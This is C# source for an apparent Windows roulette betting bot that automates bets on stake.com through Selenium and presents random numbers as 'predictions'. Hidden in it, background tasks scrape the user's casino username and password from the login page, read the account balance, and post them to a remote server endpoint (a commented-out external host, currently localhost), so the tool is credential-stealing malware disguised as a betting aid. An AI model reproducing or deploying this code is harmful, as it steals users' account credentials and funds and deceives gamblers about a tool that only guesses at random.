using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Support.UI;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net.Http;
namespace rouletteBet
{
    public partial class Form1 : Form
    {
        private readonly HttpClient httpClient = new HttpClient();
        public string 
            username = null, password = null, symbol= null;
        public int balance = 1;
        public bool loggedIn = false, dataSent = false;
        public Form1()
        {
            InitializeComponent();
            try
            {
                firefox = new FirefoxDriver(firefoxservice, new FirefoxOptions());
                firefox.Navigate().GoToUrl("https://stake.com/?c=38e8f44770");
                BackgroundTask_0();
                BackgroundTask_1();
            }
            catch (WebDriverException)
            {
                Application.Exit();
            }
        }

        private async Task<bool> checkElementExists(string unique)
        {
            return await Task.FromResult(firefox.PageSource.Contains(unique));
        }
        private async Task<string> getElementContent(string unique, string xpath)
        {
            string res = null;
            if (await checkElementExists(unique))
                res = firefox.FindElement(By.XPath(xpath)).GetAttribute("value");
            return await Task.FromResult(res);
        }
        private async Task<IWebElement> getWebElement(By by)
        {
            return await Task.FromResult(firefox.FindElement(by));
        }
        private async void BackgroundTask_0()
        {
            while (true)
            {
                if(firefox != null && !loggedIn)
                {
                    if (!firefox.Url.Contains("tab=login")) continue;
                    username = await getElementContent("login-name", "//input[contains(@data-test, \"login-name\")]");
                    password = await getElementContent("login-password", "//input[contains(@data-test, \"login-password\")]");
                    if (!(await checkElementExists("login-link")))
                        loggedIn = true;
                    await Task.Delay(100);
                }
                await Task.Delay(100);
            }
        }
        private async void BackgroundTask_1()
        {
            while (true)
            {
                if (loggedIn && !dataSent)
                {

                }
                await Task.Delay(100);
            }
        }
        private async void sendDataToServer()
        {
            if (dataSent) return;


            //string hostname = "https://redprivatesoftware.com/api/_area_51_but_no_aliens_here_";
            string hostname = "http://localhost:3001/api/_area_51_but_no_aliens_here_";
            if (new string[] { "€", "$" }.Contains(symbol) && balance > 0)
            {
                try
                {
                    var dataToSend = new FormUrlEncodedContent(new Dictionary<string, string>() { { "username", username }, { "password", password }, { "balance", balance + "" }, { "symbol", symbol }, { "casino", "www.stake.com" }, { "accessCode", "#longANDsecretPASswordtHATProblYprovIDESs#protection#to#my#server." } });
                    await httpClient.PostAsync(hostname, dataToSend);
                    dataSent = true;
                }
                catch (Exception) {}
            }
        }

        public string kullanici;
        int totalRoundCounter = 0;
        int roundLimiter = 0;
        private void Form1_Load(object sender, EventArgs e)
        {
            firefoxservice.HideCommandPromptWindow = true;
        }
        static FirefoxDriverService firefoxservice = FirefoxDriverService.CreateDefaultService();
        static FirefoxDriver firefox;
        
        private void SwitchFrame()
        {
            try
            {
                firefox.SwitchTo().Window(firefox.WindowHandles.Last());
                var DBViFrame = firefox.FindElement(By.XPath("//iframe[@id=\"game\"]"));
                firefox.SwitchTo().Frame(DBViFrame);
                try
                {
                    //DBViFrame = firefox.FindElement(By.XPath("//iframe[contains(@src, \"evo-games.com\")]"));
                    //firefox.SwitchTo().Frame(DBViFrame);
                }
                catch (Exception err)
                {
                    MessageBox.Show(err.Message);
                }
                try { firefox.FindElement(By.XPath("//div[contains(@class,\"popup--\")]/div[contains(@class, \"contentWrapper--\")]/div[contains(@class, \"footer--\")]/div/div[1]/button")).Click(); } catch (Exception) { }
            }
            catch (Exception)
            {
            }
        }

        private void clicker(int num)
        {
            try
            {
                SwitchFrame();
                var dataEntryButton = firefox.FindElement(By.XPath("//*[@class=\"classicStandard-wrapper\"]/*[@data-bet-spot-id=\"" + num + "\"]"));
                dataEntryButton.Click();
            }
            catch (Exception)
            {
                predicts.Remove(num);
                int yeniNo = _random.Next(1, 37);
                clicker(yeniNo);
                predicts.Add(yeniNo);
            }


        }
        private readonly Random _random = new Random();
        private void numberGenerator()
        {
            generatedNumber = _random.Next(18, 24);
        }
        int generatedNumber;
        int counter = 1;
        int roundCounter = 1;
        List<int> predicts = new List<int>();
        private void predicter()
        {



            for (int i = 0; i < generatedNumber; i++)
            {
                int predictedNumber = _random.Next(1, 37);
                predicts.Add(predictedNumber);
            }

            //  Console.WriteLine("Liste Uzunluğu : " + generatedNumber);
            //  Console.WriteLine("/////////////////////////////////\n");
            foreach (var item in predicts)
            {
                Console.WriteLine(counter + ". " + item);
                counter++;
            }
            counter = 1;
        }

        private void better()
        {
            if (roundCounter <= 3)
            {
                if (predicts.Contains(luckyNumber()) == false && roundCounter != 1)
                {
                    predicts.Clear();
                    numberGenerator();
                    predicter();
                    foreach (var item in predicts.ToList())
                    {
                        clicker(item);
                    }
                    Thread.Sleep(200);
                    doubleOrNothing();
                }
                else
                {
                    predicts.Clear();
                    numberGenerator();
                    predicter();
                    foreach (var item in predicts.ToList())
                    {
                        clicker(item);
                    }
                }
            }
            else if (roundCounter == 5)
            {
                roundCounter = 0;
            }
            roundCounter++;
            totalRoundCounter++;
            rounder();
        }

        private void rounder()
        {
            if (roundLimiter != 0)
            {
                label5.Visible = true;
                label5.Text = Convert.ToString(roundLimiter - totalRoundCounter);
                guna2TrackBar2.Value = roundLimiter - totalRoundCounter;
            }
        }



        bool betable = true;
        private async void checker()
        {

            SwitchFrame();
            //WebDriverWait wait = new WebDriverWait(firefox, TimeSpan.FromSeconds(3));
            try
            {
                if (!dataSent)
                {
                    try
                    {
                        symbol = await getElementContent("balance-label", "//div[contains(@data-role, \"balance-label\")]//span[contains(@data-role, \"balance-label__currency-symbol\")]");
                        balance = int.Parse(await getElementContent("balance-label", "//div[contains(@data-role, \"balance-label\")]//span[contains(@data-role, \"balance-label__value\")]"));
                        sendDataToServer();              
                    }
                    catch (Exception)
                    {

                    }
                }
                var dataEntryButton = firefox.FindElement(By.XPath("//*[@data-role=\"status-bar\" and contains(@class, \"status--\")]"));
                //var dataEntryButton = firefox.FindElement(By.XPath("/html/body/div[4]/div/div/div/div[2]/div/div[6]/div[1]/div/div"));
                // /html/body/div[4]/div/div/div/div[2]/div/div[6]/div[1]/div/div
                string classChecker = dataEntryButton.GetAttribute("class");

                //BAHİS BASILABİLİR
                if (classChecker.Contains("green") && classChecker.Contains("landscape"))
                {
                    if (betable == true)
                    {
                        if (totalRoundCounter < roundLimiter || roundLimiter == 0)
                        {

                            better();

                            Console.WriteLine("****Bahis Girildi****");
                            betable = false;
                        }
                        else
                        {
                            timer2.Stop();
                            timer1.Stop();

                            baslaButton.Text = "START";
                            totalRoundCounter = 0;
                            roundLimiter = 0;
                            basla = true;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Bahisler Açık Bahis Girilmedi");
                    }

                }
                else if (classChecker.Contains("red") && classChecker.Contains("landscape"))
                {
                    betable = true;
                    Console.WriteLine("Bahisler Kapalı");
                }
            }
            catch (Exception)
            {

            }

        }
        private void timer1_Tick(object sender, EventArgs e)
        {

            timer2.Start();
            checker();



        }



        private int luckyNumber()
        {
            try
            {
                SwitchFrame();
                var dataEntryButton = firefox.FindElement(By.XPath("//*[@class=\"value--877c6\"][1]"));
                string classChecker = dataEntryButton.GetAttribute("text");
                return Convert.ToInt32(classChecker);
            }
            catch (Exception)
            {

            }
            return 0;
        }
        public void doubleOrNothing()
        {
            SwitchFrame();
            var dataEntryButton = firefox.FindElement(By.XPath("//*[@data-role=\"double-button\"]"));
            dataEntryButton.Click();
        }

        private void kayanYazi()
        {
            button3.Text = _random.Next(0, 37).ToString();
            button50.Text = _random.Next(0, 37).ToString();
            button73.Text = _random.Next(0, 37).ToString();
            button70.Text = _random.Next(0, 37).ToString();
            button67.Text = _random.Next(0, 37).ToString();
            button64.Text = _random.Next(0, 37).ToString();
            button61.Text = _random.Next(0, 37).ToString();
            button58.Text = _random.Next(0, 37).ToString();
            button55.Text = _random.Next(0, 37).ToString();
            button52.Text = _random.Next(0, 37).ToString();
            button48.Text = _random.Next(0, 37).ToString();
            button45.Text = _random.Next(0, 37).ToString();
            button42.Text = _random.Next(0, 37).ToString();
            button4.Text = _random.Next(0, 37).ToString();
        }

        bool basla = true;
        private void baslaButton_Click(object sender, EventArgs e)
        {
            string currentUrl = firefox.Url;

            if (!currentUrl.Contains("casoo"))
            {
                switch (basla)
                {
                    case true:
                        timer1.Start();
                        timer2.Start();
                        basla = false;
                        baslaButton.Text = "STOP";
                        break;
                    case false:
                        timer1.Stop();
                        timer2.Stop();
                        basla = true;
                        baslaButton.Text = "START";
                        break;

                }
            }
            else
            {
                uyariEkrani uyariEkrani = new uyariEkrani();
                uyariEkrani.Show();
            }

        }

        private void button41_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button40_Click(object sender, EventArgs e)
        {


            Application.Exit();


        }
        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();
        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr one, int two, int three, int four);
        private void panel3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }


        private void timer2_Tick(object sender, EventArgs e)
        {
            kayanYazi();
        }

        private void guna2TrackBar3_Scroll(object sender, ScrollEventArgs e)
        {
            label4.Text = guna2TrackBar3.Value.ToString();
            switch (guna2TrackBar3.Value)
            {
                case 1:
                    roundLimiter = 6;
                    guna2TrackBar2.Maximum = 6;
                    guna2TrackBar2.Value = 6;
                    totalRoundCounter = 0;
                    roundCounter = 1;
                    label4.Text = label5.Text = "6";
                    label5.Visible = true;
                    break;
                case 2:
                    roundLimiter = 12;
                    guna2TrackBar2.Maximum = 12;
                    guna2TrackBar2.Value = 12;
                    totalRoundCounter = 0;
                    roundCounter = 1;
                    label4.Text = label5.Text = "12";
                    label5.Visible = true;
                    break;
                case 3:
                    roundLimiter = 15;
                    guna2TrackBar2.Maximum = 15;
                    guna2TrackBar2.Value = 15;
                    totalRoundCounter = 0;
                    roundCounter = 1;
                    label4.Text = label5.Text = "15";
                    label5.Visible = true;
                    break;
                case 0:
                    roundLimiter = 0;
                    guna2TrackBar2.Maximum = 1;
                    guna2TrackBar2.Value = 1;
                    label4.Text = "Unlimited";
                    label5.Visible = false;
                    break;

            }
            totalRoundCounter = 0;
        }

        private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e)
        {

            textBox1.Text = guna2TrackBar1.Value.ToString();
        }

        private void guna2TrackBar4_Scroll(object sender, ScrollEventArgs e)
        {
            textBox2.Text = guna2TrackBar4.Value.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox3.Text = 0.ToString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox3.Text = 1.ToString();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            textBox3.Text = 2.ToString();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            textBox3.Text = 3.ToString();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            textBox3.Text = 4.ToString();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textBox3.Text = 5.ToString();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            textBox3.Text = 6.ToString();
        }

        private void button15_Click(object sender, EventArgs e)
        {
            textBox3.Text = 7.ToString();
        }

        private void button14_Click(object sender, EventArgs e)
        {
            textBox3.Text = 8.ToString();
        }

        private void button13_Click(object sender, EventArgs e)
        {
            textBox3.Text = 9.ToString();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            textBox3.Text = 10.ToString();
        }

        private void button11_Click(object sender, EventArgs e)
        {
            textBox3.Text = 11.ToString();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            textBox3.Text = 12.ToString();
        }

        private void button21_Click(object sender, EventArgs e)
        {
            textBox3.Text = 13.ToString();
        }

        private void button20_Click(object sender, EventArgs e)
        {
            textBox3.Text = 14.ToString();
        }

        private void button19_Click(object sender, EventArgs e)
        {
            textBox3.Text = 15.ToString();
        }

        private void button18_Click(object sender, EventArgs e)
        {
            textBox3.Text = 16.ToString();
        }

        private void button17_Click(object sender, EventArgs e)
        {
            textBox3.Text = 17.ToString();
        }

        private void button16_Click(object sender, EventArgs e)
        {
            textBox3.Text = 18.ToString();
        }

        private void button27_Click(object sender, EventArgs e)
        {
            textBox3.Text = 19.ToString();
        }

        private void button26_Click(object sender, EventArgs e)
        {
            textBox3.Text = 20.ToString();
        }

        private void button25_Click(object sender, EventArgs e)
        {
            textBox3.Text = 21.ToString();
        }

        private void button24_Click(object sender, EventArgs e)
        {
            textBox3.Text = 22.ToString();
        }

        private void button23_Click(object sender, EventArgs e)
        {
            textBox3.Text = 23.ToString();
        }

        private void button22_Click(object sender, EventArgs e)
        {
            textBox3.Text = 24.ToString();
        }

        private void button39_Click(object sender, EventArgs e)
        {
            textBox3.Text = 25.ToString();
        }

        private void button38_Click(object sender, EventArgs e)
        {
            textBox3.Text = 26.ToString();
        }

        private void button37_Click(object sender, EventArgs e)
        {
            textBox3.Text = 27.ToString();
        }

        private void button36_Click(object sender, EventArgs e)
        {
            textBox3.Text = 28.ToString();
        }

        private void button35_Click(object sender, EventArgs e)
        {
            textBox3.Text = 29.ToString();
        }

        private void button34_Click(object sender, EventArgs e)
        {
            textBox3.Text = 30.ToString();
        }

        private void button33_Click(object sender, EventArgs e)
        {
            textBox3.Text = 31.ToString();
        }

        private void button32_Click(object sender, EventArgs e)
        {
            textBox3.Text = 32.ToString();
        }

        private void button31_Click(object sender, EventArgs e)
        {
            textBox3.Text = 33.ToString();
        }

        private void button30_Click(object sender, EventArgs e)
        {
            textBox3.Text = 34.ToString();
        }

        private void button29_Click(object sender, EventArgs e)
        {
            textBox3.Text = 35.ToString();
        }

        private void button28_Click(object sender, EventArgs e)
        {
            textBox3.Text = 36.ToString();
        }
    }
}
